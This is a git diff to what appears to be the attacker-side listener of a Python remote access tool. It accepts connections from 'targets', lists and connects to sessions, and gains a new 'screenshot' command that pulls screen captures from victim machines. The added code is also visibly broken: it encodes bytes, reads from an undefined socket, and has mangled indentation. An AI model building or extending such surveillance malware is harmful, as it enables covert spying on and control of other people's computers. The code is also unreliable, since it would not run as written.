@@ -61,7 +61,7 @@ def conection_accept():
 			conn.setblocking(1)
 			all_connection.append(conn)
 			address_connection.append(address)
-			print(f"\n  {c}[{g}+{c}] {g}Connection have ben accepted {y}IP{r} :{v} {address_connection[0:]} {y}PORT{r} :{v} {str(address_connection[1:])}")
+			print(f"\n  {c}[{g}+{c}] {g}Connection have ben accepted {y}IP{r} :{v} {address_connection[0]} {y}PORT{r} :{v} {str(address_connection[1])}")
 			continue
 		except:
 			print(f"\n  {c}[{r}-{c}] {y}Faild to accept the connection")
@@ -76,6 +76,21 @@ def intarface():
 			sys.exit()
 		elif op_listen == "show session":
 			session_list()
+		elif op_listen[0] == "screenshot":
+			s.send(op_listen.encode("utf-8"))
+			img_recv = s.recv(2048).encode("utf-8")
+			img_name, img_size = img_recv.split(SEPARATOR)
+			img_name = os.path.basename(img_name)
+			img_size = int(img_size)
+			progress = tqdm.tqdm(range(img_size), f"{c}[{g}!{c}] {g}receiving {r}{img_name}{r}", unit="B", unit_scale=True, unit_divisor=1024)
+			with open(img_name, "wb") as target_img:
+				while True:
+        			bytes_read = client_socket.recv(BUFFER_SIZE)
+        			if not bytes_read:
+            			break
+			target_img.write(bytes_read)
+			progress.update(len(bytes_read))
+			print(f"{c}{g}+{c}] {g}the screeenshot recived succesfully{none}")
 		elif op_listen[0:] == "connect":
 			session_connect()
 		elif op_listen == "help":
@@ -93,8 +108,8 @@ def session_list():
 		except socket.error as error:
 			del all_connection[i]
 			del address_connection[0]
-		#result = [f"{y}session number",f"{y}IP",f"{y}PORT"],[f"{r}{str(i)}",f"{r}str{address_connection[i][0:]}",f"{r}{address_connection[i][1:]}"]
-	#print(tabulate(result, headers="firstrow",tablefmt="fancy_grid"))
+		result = [f"{y}session number",f"{y}IP",f"{y}PORT"],[f"{r}{str(i)}",f"{r}str{address_connection[i][0]}",f"{r}{address_connection[i][1]}"]
+	print(tabulate(result, headers="firstrow",tablefmt="fancy_grid"))
 	#print(str(address_connection[i][0:]))
 '''connecting to the targets'''
 def session_connect(op_listen):
